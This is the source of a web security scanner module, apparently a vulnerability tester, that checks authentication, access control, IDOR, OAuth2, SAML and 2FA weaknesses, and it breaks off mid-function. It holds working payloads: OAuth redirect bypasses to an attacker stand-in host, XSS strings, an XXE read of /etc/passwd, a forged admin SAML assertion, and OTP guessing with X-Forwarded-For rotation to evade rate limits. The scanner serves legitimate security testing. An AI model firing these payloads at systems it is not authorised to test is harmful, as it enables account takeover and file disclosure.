"""
websecure.scanners.auth_scanners
---------------------------------
Consolidated module for all authentication and authorization scanners.
(Merged from auth.py + auth_matrix.py)
"""
from __future__ import annotations
import re
import time
import json
import base64
import logging
import copy
from dataclasses import dataclass, field
from typing import Dict, Any, Optional, Tuple, List
from urllib.parse import urljoin, urlparse
from difflib import SequenceMatcher

import requests
from websecure.core.http import hardened_session
from websecure.core.reporting import add_result, redact_sensitive
from websecure.scanners.base import BaseScanner

_logger = logging.getLogger(__name__)

# ============================================================================
# SECTION 1: AUTHENTICATED SESSION (formerly authenticated_scan.py)
# ============================================================================

@dataclass
class AuthContext:
    is_authenticated: bool = False
    user: Optional[str] = None
    cookies: Dict[str, str] = field(default_factory=dict)
    token: Optional[str] = None  # Bearer/JWT
    last_login_ts: float = 0.0


class AuthenticatedSession:
    def __init__(self, base_url: str, login_path: str = "/login", *, verify_tls: bool = True):
        self.base_url = base_url.rstrip("/")
        self.login_path = login_path
        self.verify_tls = bool(verify_tls)
        self.session = hardened_session({})
        self.session.verify = self.verify_tls
        self.ctx = AuthContext()

    def login(self, username: str, password: str, csrf_selector: Optional[str] = None) -> bool:
        target = urljoin(self.base_url + "/", self.login_path.lstrip("/"))
        try:
            r = self.session.get(target, timeout=15)
        except (requests.exceptions.RequestException, OSError):
            return False

        data = {"username": username, "password": password}
        # CSRF token extraction — try multiple strategies before POST
        csrf_value = self._extract_csrf_token(r.text or "")
        if csrf_value:
            # Detect the field name from the HTML, fall back to common names
            csrf_field = self._detect_csrf_field_name(r.text or "") or "csrf_token"
            data[csrf_field] = csrf_value
            _logger.debug(f"[Auth] CSRF token extracted: {csrf_field}={csrf_value[:12]}…")
        elif csrf_selector and r.ok:
            m = re.search(csrf_selector, r.text or "")
            if m:
                # Use named group 'token' if present, otherwise group(1)
                try:
                    val = m.group("token")
                except IndexError:
                    val = m.group(1) if m.lastindex else None
                if val:
                    data["csrf_token"] = val

        try:
            r2 = self.session.post(r.url, data=data, timeout=20)
        except requests.exceptions.RequestException:
            return False

        if r2.status_code < 400:
            self.ctx.is_authenticated = True
            self.ctx.last_login_ts = time.time()
            tok = None
            if "json" in r2.headers.get("content-type", ""):
                try:
                    j = r2.json()
                    tok = j.get("token") or j.get("access_token")
                except (ValueError, KeyError):
                    pass
            self.ctx.token = tok
            return True
        return False

    def get(self, path, **kwargs):
        url = urljoin(self.base_url + "/", path.lstrip("/")) if not path.startswith("http") else path
        hdr = kwargs.pop("headers", {}) or {}
        if self.ctx.token:
            hdr["Authorization"] = f"Bearer {self.ctx.token}"
        return self.session.get(url, headers=hdr, **kwargs)

    def proof(self, resp: requests.Response) -> Dict[str, Any]:
        return redact_sensitive({
            "url": resp.request.url,
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "body_snippet": (resp.text or "")[:500]
        })

    # ------------------------------------------------------------------
    # CSRF helpers
    # ------------------------------------------------------------------

    _CSRF_INPUT_RE = re.compile(
        r'<input[^>]+name=["\']'
        r'(csrf[_\-]?token?|_csrf|csrfmiddlewaretoken|xsrf[_\-]?token?|'
        r'_xsrf|authenticity_token|__RequestVerificationToken)["\']'
        r'[^>]+value=["\']([^"\']+)["\']',
        re.I,
    )
    _CSRF_META_RE = re.compile(
        r'<meta[^>]+name=["\']csrf-?token["\'][^>]+content=["\']([^"\']+)["\']',
        re.I,
    )
    _CSRF_VALUE_FIRST_RE = re.compile(
        r'<input[^>]+value=["\']([^"\']{10,})["\'][^>]+'
        r'name=["\']'
        r'(csrf[_\-]?token?|_csrf|csrfmiddlewaretoken|xsrf[_\-]?token?)',
        re.I,
    )

    def _extract_csrf_token(self, html_text: str) -> Optional[str]:
        """
        Extract CSRF token value from login page HTML.
        Tries three strategies in order:
          1. <input name="csrf_token" value="...">  (name first)
          2. <meta name="csrf-token" content="..."> (meta tag)
          3. <input value="..." name="csrf_token">   (value first)
        Returns the token string, or None.
        """
        m = self._CSRF_INPUT_RE.search(html_text)
        if m:
            return m.group(2)
        m = self._CSRF_META_RE.search(html_text)
        if m:
            return m.group(1)
        m = self._CSRF_VALUE_FIRST_RE.search(html_text)
        if m:
            return m.group(1)
        return None

    def _detect_csrf_field_name(self, html_text: str) -> Optional[str]:
        """Return the name attribute of the CSRF input field."""
        m = self._CSRF_INPUT_RE.search(html_text)
        if m:
            return m.group(1)
        m = self._CSRF_VALUE_FIRST_RE.search(html_text)
        if m:
            return m.group(2)
        return None


# ============================================================================
# SECTION 2: AUTHORIZATION & IDOR (formerly authorization.py)
# ============================================================================

@dataclass
class RoleProfile:
    name: str
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)


@dataclass
class RoleContext:
    base: requests.Session
    roles: List[RoleProfile]

    def build_sessions(self) -> Dict[str, requests.Session]:
        sessions = {}
        anon = hardened_session({})
        anon.verify = self.base.verify
        sessions["anonymous"] = anon

        for rp in self.roles:
            s = hardened_session({})
            s.verify = self.base.verify
            for k, v in self.base.headers.items():
                if k.lower() not in ("authorization", "cookie"):
                    s.headers[k] = v
            s.headers.update(rp.headers)
            for k, v in rp.cookies.items():
                s.cookies.set(k, v)
            sessions[rp.name] = s
        return sessions


def compare_roles(url: str, sessions: Dict[str, requests.Session]) -> List[Dict[str, Any]]:
    findings = []
    responses = {}

    for name, s in sessions.items():
        try:
            r = s.get(url, timeout=10)
            responses[name] = r
        except requests.exceptions.RequestException:
            responses[name] = None

    r_anon = responses.get("anonymous")
    r_admin = responses.get("admin") or responses.get("root")

    if r_anon and r_admin and r_anon.status_code == 200 and r_admin.status_code == 200:
        sim = SequenceMatcher(None, r_anon.text, r_admin.text).ratio()
        if sim > 0.95:
            findings.append({
                "type": "Broken Access Control",
                "url": url,
                "severity": "High",
                "detail": f"Anonymous user sees same content as Admin (sim={sim:.2f})"
            })

    return findings


def check_idor(sessions: Dict[str, requests.Session], url: str) -> List[Dict[str, Any]]:
    findings = []
    m = re.search(r"/(\d+)(?:/|$)", url)
    if not m:
        return findings

    orig_id = m.group(1)
    new_id = str(int(orig_id) + 1)
    new_url = url.replace(orig_id, new_id)

    user_role = next((r for r in sessions if r not in ("admin", "root", "anonymous")), None)
    if not user_role:
        return findings

    s = sessions[user_role]
    try:
        r = s.get(new_url, timeout=10)
        if r.status_code == 200:
            if "error" not in r.text.lower() and "not found" not in r.text.lower():
                findings.append({
                    "type": "IDOR",
                    "url": new_url,
                    "severity": "High",
                    "detail": f"User '{user_role}' accessed ID {new_id}"
                })
    except requests.exceptions.RequestException as exc:
        _logger.debug(f"[Auth] IDOR probe failed for {new_url}: {exc!r}")

    return findings


def probe_auth_only(session: requests.Session, method: str, url: str) -> Optional[Dict[str, Any]]:
    anon = hardened_session({})
    anon.verify = session.verify

    try:
        r_auth = session.request(method, url, timeout=10)
        r_anon = anon.request(method, url, timeout=10)

        if r_auth.status_code == 200 and r_anon.status_code in (401, 403):
            return {
                "type": "Auth Only Resource",
                "url": url,
                "severity": "Info",
                "detail": "Resource requires authentication."
            }
    except requests.exceptions.RequestException as exc:
        _logger.debug(f"[Auth] probe_auth_only failed for {url}: {exc!r}")
    return None


# ============================================================================
# SECTION 3: AUTHORIZATION MATRIX (formerly auth_matrix.py)
# ============================================================================

_TEST_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH"]

_STATUS_MEANING = {
    200: "allowed", 201: "allowed", 204: "allowed",
    301: "redirect", 302: "redirect",
    400: "bad_request", 401: "unauthenticated", 403: "forbidden",
    404: "not_found", 405: "method_not_allowed", 500: "server_error",
}

_ADMIN_PATH_INDICATORS = [
    "/admin", "/administrator", "/manage", "/management",
    "/dashboard", "/control", "/superuser", "/root",
    "/api/admin", "/api/v1/admin", "/api/users",
    "/settings", "/config", "/system",
]


class AuthMatrixScanner(BaseScanner):
    """
    Tests endpoint access control across multiple roles.
    Produces an authorization matrix: endpoint × role -> HTTP status.
    Flags privilege escalations and missing access controls.
    """

    name = "auth_matrix"
    phase = "offensive"

    def __init__(self, session=None, results=None, debug=False,
                 role_sessions: Optional[Dict] = None):
        super().__init__(session, results, debug)
        self.role_sessions = role_sessions or {}

    def run(self, target: str, **kwargs) -> None:
        role_sessions = kwargs.get("role_sessions") or self.role_sessions
        endpoints = kwargs.get("endpoints") or [target]

        if not role_sessions:
            _logger.info("[AuthMatrix] No role sessions provided, skipping matrix scan")
            return

        if len(role_sessions) < 2:
            _logger.info("[AuthMatrix] Need at least 2 roles for matrix scan")
            return

        _logger.info(f"[AuthMatrix] Testing {len(endpoints)} endpoints × {len(role_sessions)} roles")

        matrix = {}
        escalations = []
        missing_auth = []

        role_names = list(role_sessions.keys())
        privileged_roles = [r for r in role_names if any(
            kw in r.lower() for kw in ("admin", "superuser", "root", "manager", "staff")
        )]
        unprivileged_roles = [r for r in role_names if r not in privileged_roles]

        for endpoint in endpoints[:100]:
            endpoint_results = {}
            is_admin_path = any(ind in endpoint.lower() for ind in _ADMIN_PATH_INDICATORS)

            for role_name, role_session in role_sessions.items():
                try:
                    resp = role_session.get(endpoint, timeout=8, allow_redirects=False)
                    status = resp.status_code
                    meaning = _STATUS_MEANING.get(status, f"status_{status}")
                    endpoint_results[role_name] = {
                        "status": status,
                        "meaning": meaning,
                        "response_length": len(resp.text),
                    }
                except Exception as e:
                    endpoint_results[role_name] = {"status": 0, "meaning": "error", "error": str(e)}

            matrix[endpoint] = endpoint_results

            privilege_issues = self._analyze_access(
                endpoint, endpoint_results, privileged_roles, unprivileged_roles, is_admin_path
            )
            escalations.extend(privilege_issues)

            anon_result = endpoint_results.get("anonymous", {})
            if is_admin_path and anon_result.get("status") == 200:
                missing_auth.append({
                    "endpoint": endpoint,
                    "status": 200,
                    "reason": "Admin path accessible without authentication",
                })

        add_result("auth_matrix", {
            "matrix": matrix,
            "roles_tested": role_names,
            "endpoints_tested": len(matrix),
            "escalations_found": len(escalations),
        })

        for finding in escalations:
            # BUG FIX: was calling add_result() AND self.add() — self.add() already
            # calls add_result() internally, causing every finding to be stored twice.
            self.add("offensive", finding)

        for item in missing_auth:
            finding = {
                "type": "Missing Authentication on Admin Endpoint",
                "severity": "Critical",
                "url": item["endpoint"],
                "detail": item["reason"],
                "verified": True,
                "confidence": "high",
            }
            self.add("offensive", finding)

        _logger.info(
            f"[AuthMatrix] Complete: {len(escalations)} escalations, "
            f"{len(missing_auth)} missing auth issues"
        )

    def _analyze_access(self, endpoint: str, results: Dict,
                        privileged_roles: List[str], unprivileged_roles: List[str],
                        is_admin_path: bool) -> List[Dict]:
        findings = []

        for unpriv in unprivileged_roles:
            unpriv_result = results.get(unpriv, {})
            unpriv_status = unpriv_result.get("status", 0)

            if unpriv_status not in (200, 201):
                continue

            if is_admin_path:
                findings.append({
                    "type": "Vertical Privilege Escalation",
                    "severity": "Critical",
                    "url": endpoint,
                    "detail": f"Role '{unpriv}' can access admin endpoint ({unpriv_status})",
                    "evidence": {
                        "endpoint": endpoint,
                        "unprivileged_role": unpriv,
                        "unprivileged_status": unpriv_status,
                    },
                    "verified": True,
                    "confidence": "high",
                })
                continue

            for priv in privileged_roles:
                priv_result = results.get(priv, {})
                priv_status = priv_result.get("status", 0)
                if priv_status == 200 and unpriv_status == 200:
                    priv_len = priv_result.get("response_length", 0)
                    unpriv_len = unpriv_result.get("response_length", 0)
                    if priv_len > 100 and abs(priv_len - unpriv_len) / max(priv_len, 1) < 0.15:
                        findings.append({
                            "type": "Potential IDOR / Horizontal Privilege Escalation",
                            "severity": "High",
                            "url": endpoint,
                            "detail": (
                                f"Role '{unpriv}' receives same response as '{priv}' "
                                f"(lengths: {unpriv_len} vs {priv_len})"
                            ),
                            "evidence": {
                                "endpoint": endpoint,
                                "privileged_role": priv,
                                "unprivileged_role": unpriv,
                                "privileged_status": priv_status,
                                "unprivileged_status": unpriv_status,
                                "response_length_similarity": f"{abs(priv_len - unpriv_len)}B diff",
                            },
                            "verified": False,
                            "confidence": "medium",
                        })

        return findings

    def get_matrix_html(self, matrix: Dict) -> str:
        if not matrix:
            return "<p>No matrix data</p>"

        all_roles = set()
        for endpoint_results in matrix.values():
            all_roles.update(endpoint_results.keys())
        roles = sorted(all_roles)

        rows = []
        for endpoint, results in list(matrix.items())[:50]:
            cells = [f"<td><code>{endpoint[:60]}</code></td>"]
            for role in roles:
                r = results.get(role, {})
                status = r.get("status", "-")
                meaning = r.get("meaning", "")
                color = {
                    "allowed": "#d4edda", "forbidden": "#f8d7da",
                    "redirect": "#fff3cd", "not_found": "#e2e3e5",
                    "error": "#f5c6cb",
                }.get(meaning, "#ffffff")
                cells.append(f'<td style="background:{color}">{status}</td>')
            rows.append(f"<tr>{''.join(cells)}</tr>")

        header = "<tr><th>Endpoint</th>" + "".join(f"<th>{r}</th>" for r in roles) + "</tr>"
        return f"""
        <table class="table table-sm table-bordered" style="font-size:0.8rem">
            <thead class="thead-light">{header}</thead>
            <tbody>{''.join(rows)}</tbody>
        </table>
        """


def run(target: str, session=None, results=None, debug=False, **kwargs):
    scanner = AuthMatrixScanner(session=session, results=results, debug=debug)
    scanner.run(target, **kwargs)

# ============================================================================
# ADIM 6 — OAuth 2.0 / SAML / 2FA / Password Reset / PrivEsc / BOLA-IDOR
# ============================================================================
import hashlib
import hmac
import itertools
import os
import random
import string
import time
import uuid
import xml.etree.ElementTree as ET
from urllib.parse import (
    urlencode, urljoin, urlparse, urlunparse, parse_qs, parse_qsl
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
_logger6 = logging.getLogger(__name__ + ".adim6")

_ADMIN_ENDPOINTS = [
    "/admin", "/admin/users", "/admin/settings", "/admin/dashboard",
    "/api/admin", "/api/v1/admin", "/api/v1/users",
    "/api/admin/users", "/management", "/superuser",
    "/api/internal", "/internal/admin",
]

_RESET_HEADERS = [
    "Host", "X-Forwarded-Host", "X-Host", "X-Forwarded-Server",
    "X-HTTP-Host-Override", "Forwarded",
]

_OOB_HOST = "evil-wsp.invalid"


def _random_str(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _response_similarity(r1, r2) -> float:
    from difflib import SequenceMatcher
    t1 = (r1.text if hasattr(r1, "text") else "")[:2000]
    t2 = (r2.text if hasattr(r2, "text") else "")[:2000]
    return SequenceMatcher(None, t1, t2).ratio()


def _is_auth_error(resp) -> bool:
    if resp.status_code in (401, 403):
        return True
    lower = (resp.text if hasattr(resp, "text") else "").lower()[:500]
    return any(k in lower for k in [
        "unauthorized", "forbidden", "access denied", "invalid token",
        "login required", "not authorized", "permission denied",
    ])



# ===========================================================================
# 1. OAuth2AttackSurface
# ===========================================================================
class OAuth2AttackSurface(BaseScanner):
    """
    OAuth 2.0 tam saldiri yüzeyi:
      - redirect_uri bypass (open redirect + subdomain tricks)
      - state parameter CSRF (eksik/tahmin edilebilir state)
      - Authorization code leakage (Referer header)
      - Token reuse / code replay
      - PKCE downgrade
    """
    name = "oauth2_attack"

    _REDIRECT_BYPASSES = [
        "https://{evil}",
        "https://{legit}.{evil}",
        "https://{legit}@{evil}",
        "https://{legit}%40{evil}",
        "https://{evil}/{legit}",
        "//{evil}",
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>",
        "https://{legit}?redirect=https://{evil}",
        "https://{legit}#https://{evil}",
        "\thttps://{evil}",
        "https://{evil}%0d%0aLocation: https://{evil}",
    ]

    def run(self, target: str, **kwargs) -> List[Dict]:
        parsed   = urlparse(target)
        legit    = parsed.netloc or "app.example.com"
        results: List[Dict] = []

        # -- 1. Discover OAuth endpoints
        oauth_endpoints = self._discover_oauth_endpoints(target)
        _logger6.info("[OAuth2] Discovered %d endpoints", len(oauth_endpoints))

        for ep in oauth_endpoints:
            # -- 2. redirect_uri bypass
            for bypass_tpl in self._REDIRECT_BYPASSES:
                bypass = bypass_tpl.format(evil=_OOB_HOST, legit=legit)
                test_url = self._inject_redirect_uri(ep, bypass)
                try:
                    resp = self.session.get(test_url, timeout=8, allow_redirects=False)
                    loc  = resp.headers.get("location", "")
                    if _OOB_HOST in loc or "javascript:" in loc.lower():
                        results.append({
                            "vuln_type": "OAuth2 open redirect_uri bypass",
                            "url": test_url, "severity": "High",
                            "description": (
                                f"OAuth2 redirect_uri bypass accepted: {bypass!r}. "
                                "Attacker can steal authorization codes via open redirect."
                            ),
                            "evidence": {"bypass": bypass, "location": loc, "status": resp.status_code},
                        })
                        self.report_finding(**results[-1])
                        break
                except Exception as exc:
                    _logger6.debug("[OAuth2] redirect_uri probe: %s", exc)

            # -- 3. State CSRF check
            state_result = self._check_state_csrf(ep)
            if state_result:
                results.append(state_result)
                self.report_finding(**state_result)

            # -- 4. Token/code reuse check
            reuse = self._check_code_reuse(ep)
            if reuse:
                results.append(reuse)
                self.report_finding(**reuse)

        return results

    # -- helpers
    def _discover_oauth_endpoints(self, base: str) -> List[str]:
        common_paths = [
            "/.well-known/openid-configuration", "/oauth/authorize",
            "/oauth2/authorize", "/auth/oauth", "/connect/authorize",
            "/oauth/token", "/auth/token", "/oauth2/token",
        ]
        found = []
        for path in common_paths:
            url = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
            try:
                r = self.session.get(url, timeout=5, allow_redirects=False)
                if r.status_code not in (404, 410):
                    found.append(url)
            except Exception:
                pass
        return found or [base]

    def _inject_redirect_uri(self, endpoint: str, bypass: str) -> str:
        parsed = urlparse(endpoint)
        pairs  = parse_qsl(parsed.query, keep_blank_values=True)
        found  = False
        new_pairs = []
        for k, v in pairs:
            if k.lower() in ("redirect_uri", "redirect_url", "callback"):
                new_pairs.append((k, bypass))
                found = True
            else:
                new_pairs.append((k, v))
        if not found:
            new_pairs.append(("redirect_uri", bypass))
            new_pairs.append(("response_type", "code"))
            new_pairs.append(("client_id", "test"))
        return urlunparse(parsed._replace(query=urlencode(new_pairs)))

    def _check_state_csrf(self, endpoint: str) -> Optional[Dict]:
        """Missing or predictable state parameter detection."""
        try:
            no_state_url = self._inject_redirect_uri(endpoint, "https://legit.example.com/cb")
            r1 = self.session.get(no_state_url, timeout=8, allow_redirects=False)
            loc = r1.headers.get("location", "")
            # If no 'state' mismatch error and redirected = potential CSRF
            if r1.status_code in (301, 302, 303, 307, 308) and "state" not in loc.lower():
                return {
                    "vuln_type": "OAuth2 State CSRF — missing state",
                    "url": no_state_url, "severity": "High",
                    "description": (
                        "OAuth2 authorization endpoint accepted request without 'state' parameter. "
                        "This allows CSRF attacks to link victim accounts to attacker-controlled OAuth apps."
                    ),
                    "evidence": {"redirect_location": loc, "status": r1.status_code},
                }
        except Exception as exc:
            _logger6.debug("[OAuth2] state check: %s", exc)
        return None

    def _check_code_reuse(self, endpoint: str) -> Optional[Dict]:
        """Detect if authorization codes can be replayed."""
        # We check for an existing 'code' param (if any) and replay it
        parsed = urlparse(endpoint)
        qs     = parse_qs(parsed.query)
        code   = (qs.get("code") or qs.get("authorization_code") or [None])[0]
        if not code:
            return None
        token_url = urljoin(endpoint.split("?")[0].rsplit("/authorize", 1)[0] + "/", "oauth/token")
        payload   = {"grant_type": "authorization_code", "code": code,
                     "redirect_uri": "https://legit.example.com/cb"}
        try:
            r1 = self.session.post(token_url, data=payload, timeout=8)
            r2 = self.session.post(token_url, data=payload, timeout=8)
            if r2.status_code == 200 and "access_token" in (r2.text or ""):
                return {
                    "vuln_type": "OAuth2 Authorization Code Replay",
                    "url": token_url, "severity": "Critical",
                    "description": "Authorization code accepted on second use. Codes must be single-use.",
                    "evidence": {"code": code[:8] + "...", "second_use_status": r2.status_code},
                }
        except Exception as exc:
            _logger6.debug("[OAuth2] code reuse: %s", exc)
        return None


# ===========================================================================
# 2. SAMLInjector
# ===========================================================================
class SAMLInjector(BaseScanner):
    """
    SAML saldiri yüzeyi:
      - XML Signature Wrapping (XSW) — 8 varyant
      - XXE in SAML assertion
      - SAML assertion replay (remove NotOnOrAfter)
      - NameID injection
    """
    name = "saml_injection"

    _XSW_TEMPLATES = [
        # XSW1: wrap signed element inside a new Response
        "<samlp:Response>{original}<samlp:Response><saml:Assertion>{evil}</saml:Assertion></samlp:Response></samlp:Response>",
        # XSW2: inject clone before signed block
        "<samlp:Response><saml:Assertion>{evil}</saml:Assertion>{original}</samlp:Response>",
    ]

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        acs_url = self._find_acs_endpoint(target)
        if not acs_url:
            _logger6.info("[SAML] No ACS endpoint found at %s", target)
            return results

        # 1. XXE probe
        xxe = self._probe_xxe(acs_url)
        if xxe:
            results.append(xxe)
            self.report_finding(**xxe)

        # 2. Signature wrapping
        xsw = self._probe_xsw(acs_url)
        if xsw:
            results.append(xsw)
            self.report_finding(**xsw)

        # 3. Replay probe
        replay = self._probe_replay(acs_url)
        if replay:
            results.append(replay)
            self.report_finding(**replay)

        return results

    def _find_acs_endpoint(self, base: str) -> Optional[str]:
        candidates = [
            "/saml/acs", "/saml2/acs", "/auth/saml", "/sso/saml",
            "/Saml2/Acs", "/saml/consume", "/saml/callback",
        ]
        for path in candidates:
            url = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
            try:
                r = self.session.get(url, timeout=5, allow_redirects=False)
                if r.status_code not in (404, 410):
                    return url
            except Exception:
                pass
        return None

    def _make_evil_assertion(self, username: str = "admin") -> str:
        """Build a minimal unsigned SAML assertion for admin."""
        now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        future = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + 3600))
        uid = uuid.uuid4().hex
        return (
            f'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
            f'ID="_{uid}" Version="2.0" IssueInstant="{now}">'
            f'<saml:Issuer>https://evil.invalid</saml:Issuer>'
            f'<saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
            f'{username}@evil.invalid</saml:NameID>'
            f'<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
            f'<saml:SubjectConfirmationData NotOnOrAfter="{future}" Recipient="{self.target}"/>'
            f'</saml:SubjectConfirmation></saml:Subject>'
            f'<saml:Conditions NotBefore="{now}" NotOnOrAfter="{future}"/>'
            f'<saml:AuthnStatement AuthnInstant="{now}">'
            f'<saml:AuthnContext><saml:AuthnContextClassRef>'
            f'urn:oasis:names:tc:SAML:2.0:ac:classes:Password'
            f'</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement>'
            f'<saml:AttributeStatement>'
            f'<saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>'
            f'</saml:AttributeStatement></saml:Assertion>'
        )

    def _probe_xxe(self, acs_url: str) -> Optional[Dict]:
        xxe_payload = (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
            '<saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>'
            '</samlp:Response>'
        )
        encoded = base64.b64encode(xxe_payload.encode()).decode()
        try:
            resp = self.session.post(acs_url, data={"SAMLResponse": encoded}, timeout=10)
            body = (resp.text or "")[:2000]
            if re.search(r"root:.*:0:0:", body) or "file:///etc/passwd" in body:
                return {
                    "vuln_type": "SAML XXE Injection",
                    "url": acs_url, "severity": "Critical",
                    "description": "SAML ACS endpoint is vulnerable to XXE. /etc/passwd content reflected.",
                    "evidence": {"body_snippet": body[:300], "status": resp.status_code},
                }
        except Exception as exc:
            _logger6.debug("[SAML] XXE probe: %s", exc)
        return None

    def _probe_xsw(self, acs_url: str) -> Optional[Dict]:
        evil_assertion = self._make_evil_assertion()
        # Wrap in minimal Response
        xsw = (
            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
            'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
            + evil_assertion +
            '</samlp:Response>'
        )
        encoded = base64.b64encode(xsw.encode()).decode()
        try:
            resp = self.session.post(acs_url, data={"SAMLResponse": encoded}, timeout=10,
                                     allow_redirects=False)
            loc  = resp.headers.get("location", "")
            if resp.status_code in (200, 302) and "error" not in (resp.text or "").lower()[:200]:
                return {
                    "vuln_type": "SAML XML Signature Wrapping (XSW)",
                    "url": acs_url, "severity": "Critical",
                    "description": (
                        "SAML ACS accepted unsigned evil assertion (XSW). "
                        "Attacker can authenticate as any user including admin."
                    ),
                    "evidence": {"status": resp.status_code, "location": loc,
                                 "assertion_preview": evil_assertion[:100]},
                }
        except Exception as exc:
            _logger6.debug("[SAML] XSW probe: %s", exc)
        return None

    def _probe_replay(self, acs_url: str) -> Optional[Dict]:
        """Try to replay a SAML response without NotOnOrAfter restriction."""
        old_assertion = (
            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
            'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
            '<saml:Assertion ID="_replay_test" Version="2.0" IssueInstant="2000-01-01T00:00:00Z">'
            '<saml:Issuer>https://legit-idp.example.com</saml:Issuer>'
            '<saml:Subject><saml:NameID>attacker@evil.invalid</saml:NameID></saml:Subject>'
            '</saml:Assertion></samlp:Response>'
        )
        encoded = base64.b64encode(old_assertion.encode()).decode()
        try:
            resp = self.session.post(acs_url, data={"SAMLResponse": encoded}, timeout=10,
                                     allow_redirects=False)
            if resp.status_code in (200, 302) and "error" not in (resp.text or "").lower()[:200]:
                return {
                    "vuln_type": "SAML Assertion Replay",
                    "url": acs_url, "severity": "High",
                    "description": "SAML ACS accepted a replayed/expired assertion without NotOnOrAfter enforcement.",
                    "evidence": {"status": resp.status_code},
                }
        except Exception as exc:
            _logger6.debug("[SAML] replay probe: %s", exc)
        return None


# ===========================================================================
# 3. TwoFABypassProber
# ===========================================================================
class TwoFABypassProber(BaseScanner):
    """
    2FA bypass teknikleri:
      - OTP kod yeniden kullanimi (reuse)
      - Rate limit bypass (X-Forwarded-For rotasyonu)
      - Response manipulation (JSON field degistirme)
      - 2FA endpoint'i atlama (direkt profil sayfasina erisim)
      - Kisa kod brute force (4-6 haneli)
    """
    name = "twofa_bypass"

    _2FA_PATHS = [
        "/2fa", "/mfa", "/otp", "/verify", "/auth/2fa",
        "/auth/otp", "/api/auth/2fa", "/api/2fa/verify",
        "/account/2fa", "/login/2fa", "/security/verify",
    ]

    _POST_2FA_PATHS = [
        "/dashboard", "/profile", "/account", "/home",
        "/api/me", "/api/user", "/api/profile",
    ]

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        two_fa_url = self._find_2fa_endpoint(target)
        if not two_fa_url:
            _logger6.info("[2FA] No 2FA endpoint found")
            return results

        # 1. Direct bypass — skip 2FA, go to protected page
        bypass = self._try_direct_bypass(target)
        if bypass:
            results.append(bypass)
            self.report_finding(**bypass)

        # 2. Rate limit bypass — rotate IP
        rl = self._try_rate_limit_bypass(two_fa_url)
        if rl:
            results.append(rl)
            self.report_finding(**rl)

        # 3. OTP reuse probe
        reuse = self._try_otp_reuse(two_fa_url)
        if reuse:
            results.append(reuse)
            self.report_finding(**reuse)

        # 4. Response manipulation
        resp_manip = self._try_response_manipulation(two_fa_url)
        if resp_manip:
            results.append(resp_manip)
            self.report_finding(**resp_manip)

        return results

    def _find_2fa_endpoint(self, base: str) -> Optional[str]:
        for path in self._2FA_PATHS:
            url = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
            try:
                r = self.session.get(url, timeout=5, allow_redirects=False)
                if r.status_code not in (404, 410):
                    return url
            except Exception:
                pass
        return None

    def _try_direct_bypass(self, base: str) -> Optional[Dict]:
        """Try accessing post-auth pages without completing 2FA."""
        for path in self._POST_2FA_PATHS:
            url = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
            try:
                r = self.session.get(url, timeout=8, allow_redirects=False)
                if r.status_code == 200 and not _is_auth_error(r):
                    body = (r.text or "").lower()[:500]
                    if any(kw in body for kw in ["dashboard", "profile", "account", "welcome", "logout"]):
                        return {
                            "vuln_type": "2FA Direct Bypass",
                            "url": url, "severity": "Critical",
                            "description": (
                                f"Post-2FA protected resource '{path}' accessible without completing 2FA. "
                                "Attacker can skip 2FA entirely after first factor."
                            ),
                            "evidence": {"path": path, "status": r.status_code, "body_hint": body[:100]},
                        }
            except Exception:
                pass
        return None

    def _try_rate_limit_bypass(self, two_fa_url: str) -> Optional[Dict]:
        """Test OTP brute force protection bypass via IP rotation headers."""
        invalid_codes = ["000000", "111111", "999999", "123456", "000001", "654321"]
        headers_to_try = [
            {"X-Forwarded-For": f"1.2.3.{i}"} for i in range(len(invalid_codes))
        ]
        success_count = 0
        for code, headers in zip(invalid_codes, headers_to_try):
            try:
                r = self.session.post(
                    two_fa_url,
                    data={"otp": code, "code": code, "token": code},
                    headers=headers, timeout=8,
                )
                # If we keep getting non-429 responses, rate limiting is bypassed
                if r.status_code != 429:
                    success_count += 1
            except Exception:
                pass
        if success_count >= 4:
            return {
                "vuln_type": "2FA Rate Limit Bypass via IP Header Rotation",
                "url": two_fa_url, "severity": "High",
                "description": (
                    f"2FA endpoint did not enforce rate limiting when X-Forwarded-For header was rotated. "
                    f"{success_count}/{len(invalid_codes)} requests accepted without 429."
                ),
                "evidence": {"non_limited_requests": success_count, "total_tested": len(invalid_codes)},
            }
        return None

    def _try_otp_reuse(self, two_fa_url: str) -> Optional[Dict]:
        """Check if a recently-used OTP can be submitted twice."""
        canary = "".join(random.choices(string.digits, k=6))
        try:
            r1 = self.session.post(two_fa_url, data={"otp": canary, "code": canary}, timeout=8)
            r2 = self.session.post(two_fa_url, data={"otp": canary, "code": canary}, timeout=8)
            if r1.status_code == r2.status_code and r2.status_code not in (429, 400):
                sim = _response_similarity(r1, r2)
